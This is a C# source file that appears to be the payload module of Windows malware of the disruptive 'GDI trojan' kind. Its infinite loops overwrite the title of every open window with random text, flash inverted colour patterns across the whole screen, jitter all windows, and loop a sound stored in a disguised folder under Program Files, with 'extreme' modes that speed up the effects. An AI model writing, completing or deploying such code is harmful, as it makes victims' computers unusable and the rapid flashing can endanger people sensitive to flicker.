using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace version1
{
    public class gdi_payload
    {
        private SoundPlayer amb1;
        public void loop_titles()
        {
            Random rand;
            while (true)
            {
                var generator_h = new Generator();
                rand = new Random();
                IntPtr hwnd = Dll_Imports.GetTopWindow(Dll_Imports.GetDesktopWindow());
                hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDLAST);
                do
                {
                    Dll_Imports.SetWindowText(hwnd, generator_h.GenerateToken(rand.Next(100)));
                } while ((hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDPREV)) != IntPtr.Zero);
                Thread.Sleep(100);
            }
        }
        public void sound_effect()
        {
            Random rand;
            rand = new Random();
            string resources_path = @"C:\Program Files (x86)\Microsoft\Temp\";
            string[] snd_list = { resources_path + "noise2.wav" };
            if (File.Exists(snd_list[0])){
                amb1 = new SoundPlayer(snd_list[0]);
                amb1.PlayLooping();
            }          
        }
        public void gdi_payloads()
        {
            Random rand;
            while(true)
            {
                int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
                uint[] rnd_color = { 0x190000, 0x001900, 0x000019, 0x191900, 0x001919, 0x190019,
                0x990000, 0x009900, 0x000099, 0x999900, 0x009999, 0x990099};
                rand = new Random();
                IntPtr hdc = Dll_Imports.GetDC(IntPtr.Zero);
                byte[] bits = { 0xff, 0xff, 0xc3, 0xc3, 0xc3, 0xc3, 0xff, 0xff };
                IntPtr bitmap = Dll_Imports.CreateBitmap(rand.Next(20), rand.Next(20), 1, 1, bits);
                IntPtr brush = Dll_Imports.CreatePatternBrush(bitmap);
                if(payload_timer.rapid_gdi == false)
                    Dll_Imports.SetBkColor(hdc, rnd_color[rand.Next(6)]);
                else
                    Dll_Imports.SetBkColor(hdc, rnd_color[rand.Next(rnd_color.Length)]);
                Dll_Imports.SelectObject(hdc, brush);
                Dll_Imports.PatBlt(hdc, 0, 0, x, y, Dll_Imports.TernaryRasterOperations.PATINVERT);
                Dll_Imports.DeleteObject(bitmap);
                Dll_Imports.DeleteObject(brush);
                Dll_Imports.DeleteDC(hdc);
                if (payload_timer.extreme == false)
                    Thread.Sleep(100);
                else
                    Thread.Sleep(1);
            }
        }
        public void window_shake()
        {
            Random rand;
            while (true)
            {
                rand = new Random();
                IntPtr hwnd = Dll_Imports.GetTopWindow(Dll_Imports.GetDesktopWindow());
                hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDLAST);
                do
                {
                    Dll_Imports.RECT myrect;
                    Dll_Imports.GetWindowRect(hwnd, out myrect);
                    Dll_Imports.MoveWindow(hwnd, myrect.Left + rand.Next(-20, 21), myrect.Top + rand.Next(-20, 21),
                    myrect.Right - myrect.Left, myrect.Bottom - myrect.Top, true);
                } while ((hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDPREV)) != IntPtr.Zero);
                if (payload_timer.extreme == false)
                    Thread.Sleep(10);
                else 
                    Thread.Sleep(1);
            }
        }
    }
}
